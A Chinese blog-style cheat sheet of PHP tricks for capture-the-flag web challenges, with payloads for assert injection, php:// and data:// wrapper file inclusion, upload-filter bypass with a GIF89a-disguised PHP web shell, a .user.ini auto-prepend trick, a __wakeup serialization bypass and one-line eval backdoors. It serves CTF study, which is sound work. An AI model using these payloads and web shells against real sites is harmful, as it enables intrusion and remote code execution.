---
title: CTF中比赛中PHP相关的知识点
date: 2022-12-29 21:46:39
keywords: ctf php, ctf php知识点
description: 总结 CTF 比赛中可能遇到的 PHP 相关的知识点，本文只做关键信息的总结，具体内容可以依据关键信息在互联网搜索操作步骤。 
---

## 一些函数的绕开

`str_replace / strstr` 函数在匹配 `php://` 字符串时，可以考虑使用大小写或大小写混合的方式绕过检查。

`assert` 绕过可以使用 `*1') or system("cat templates/flag.php");//*`  的方式。

`strpos`  

`preg_replace` 存在 /e 执行漏洞。


## 文件读取

```php
<?php  
// $filename 可以用 GET / POST 方式传入
if( isset($text) && (file_get_contents($filename,'r')==="hello ctf")){

}
```

当遇到 file_get_contents($file_name) 代码做条件判断时，尝试通过 data 伪协议传入希望读取的内容。data 伪协议也可以被 `include` 函数调用，从PHP5.2.0起，数据封装流就开始有效，用于数据流的读取。如果传入的都是PHP代码，就会执行任意代码。

### data 伪协议

```php
data://text/plain,hello ctf
data://text/plain;base64,aGVsbG8gY3Rm

/ 可以使用 &#47;
data:&#47;&#47;text&#47;plain,4
```

### php 伪协议

当遇到 `include` 函数时，可以用 `php://` 伪协议将文件内容打印出来


```sh
# 用于执行代码
?file=php://input
# 用户获取源码
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/convert.iconv.UTF-8.UTF-7/resource=index.php

?file=php://filter/convert.iconv.UCS-4*.UCS-4BE/resource=check.php
?file=php://filter/convert.iconv.EUC-JP%2a.UCS-4*/resource=flag.php
```

### 使用网络路径

```sh
?file=http://localhost:8081/phpinfo.php?.txt
```



## 文件上传绕过

文件上传功能风险在于被人上传木马，经常用到的一句话木马为 `<?php eval($_GET['a']); ?>`，而绕过的方法有很多种。

* 前端校验
* MIME绕过
* 文件头校验
* 截断绕过
* 图片木马

在文本文件中添加 `GIF89a` 并保存为 jpg 文件，可以伪装成图片文件。利用 `<?` 短符号，可以绕过 php 文件的探测。

```sh
GIF89a                                                                                                                                                                                
<?=eval($_REQUEST['cmd']);?>
```

`.user.ini` 配置，可以将某个文件默认追加到所有执行 php 的文件的头部

```sh
GIF89a                  
auto_prepend_file=b.jpg
```

## 反序列化绕过

序列化就是将运行中的数据或者对象保存为持久化的数据，并且支持将持久化的数据反序列化转换为数据或者对象。序列化的目的是方便数据的传输和存储。

php 的序列化和反序列化会用到 `serialize` 和 `unserialize` 函数。

```php
// 使用这两个替换，可以绕过 wakeup 函数
$a = str_replace(':4:', ':+4:', $a);
$a = str_replace(':1:', ':2:', $a);
```



## 弱类型比较的漏洞

在一些代码审计的题目中，可能存在弱类型漏洞，需要敏锐的发现这些问题。



## 一句话木马

通常PHP的一句话代码是这样的

```php
<?php

//One Word Backdoor
eval($_POST['a']);
//或者这种，可以支持GET/POST请求
//eval($_REQUEST['a'];

?>
```

在有的题目中，需要上传 PHP5 格式的代码，



## 参考资料

1. [CTF include](https://blog.csdn.net/qq_61774705/article/details/126323696)
1. [攻防世界CTF —— PHP本地文件包含漏洞解题思路](https://blog.csdn.net/weixin_47610939/article/details/126019042)
1. [2021-02-23-ctf-Web_php_unserialize反序列化漏洞](https://blog.csdn.net/weixin_43639682/article/details/123686797)
1. [[CTF]PHP反序列化总结](https://blog.csdn.net/solitudi/article/details/113588692)
1. [XCTF-攻防世界CTF平台-Web类——19、mfw（.Git源代码泄露、php的assert断言）](https://blog.csdn.net/Onlyone_1314/article/details/121876664)
1. [路径穿越（Path Traversal）详解](https://blog.csdn.net/qingzhantianxia/article/details/128204437)
